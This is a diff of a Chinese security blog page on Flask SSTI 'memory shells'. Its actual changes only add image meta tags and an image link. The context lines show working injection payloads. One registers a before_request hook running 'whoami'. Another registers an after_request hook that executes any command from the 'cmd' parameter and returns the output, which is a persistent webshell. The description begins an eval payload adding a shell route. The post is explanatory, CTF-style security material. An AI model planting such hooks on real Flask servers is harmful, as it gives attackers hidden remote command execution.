@@ -13,12 +13,14 @@
 <meta property="og:site_name" content="Thr2on1&#39;s Blog">
 <meta property="og:description" content="debug模式如果程序开启了debug模式，那么一般是要计算pin值，计算出pin值就很简单了。 非debug模式0x01 旧版内存马低版本的flask(ssti)一般可以直接使用以下payload： 1url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;&#x2F;shel">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Thr2on1/BlogImages/main/img/Pasted%20image%2020250417093253.png">
 <meta property="article:published_time" content="2025-05-29T08:48:51.000Z">
-<meta property="article:modified_time" content="2025-05-29T09:13:31.124Z">
+<meta property="article:modified_time" content="2025-05-29T09:39:23.845Z">
 <meta property="article:author" content="Thr2on1">
 <meta property="article:tag" content="WEB">
 <meta property="article:tag" content="Flask">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Thr2on1/BlogImages/main/img/Pasted%20image%2020250417093253.png">
     
     
       
@@ -183,7 +185,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()),&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;</span><br></pre></td></tr></table></figure>
 <p>但是原内容会被before_request的返回内容覆盖，我们可以使用after_request解决这个问题。</p>
 <p><strong>after_request</strong></p>
-<p>先看以下函数介绍：<br>![[Pasted image 20250417093253.png]]<br>这个解释器要求我们接收一个response对象，并且返回一个response对象。因此我们在定义匿名函数的时候需要设置一个参数(默认为respose类型)<br>payload:</p>
+<p>先看以下函数介绍：<br><img src="https://raw.githubusercontent.com/Thr2on1/BlogImages/main/img/Pasted%20image%2020250417093253.png" alt="Pasted image 20250417093253"><br>这个解释器要求我们接收一个response对象，并且返回一个response对象。因此我们在定义匿名函数的时候需要设置一个参数(默认为respose类型)<br>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None,[]).append(lambda resp: make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()) if request.args.get(&#x27;cmd&#x27;) else resp)</span><br></pre></td></tr></table></figure>
 <p>SSTI中用法跟before_request一样。</p>
 <p><strong>teardown_request</strong></p>
